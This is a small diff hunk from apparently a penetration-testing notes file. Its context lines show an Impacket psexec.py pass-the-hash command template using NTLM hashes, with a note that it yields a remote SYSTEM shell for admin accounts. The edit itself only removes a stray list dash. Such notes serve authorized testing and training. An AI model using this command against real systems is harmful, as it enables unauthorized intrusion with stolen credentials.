@@ -61,7 +61,7 @@ psexec.py <domain>/<username>@<target_ip> -hashes <LM_Hash>:<NT_Hash>
 - `-hashes` allows direct use of NTLM hashes.
 
 - If the account is a local or domain admin, this spawns a remote SYSTEM shell.
-- 
+
 
 ---
 
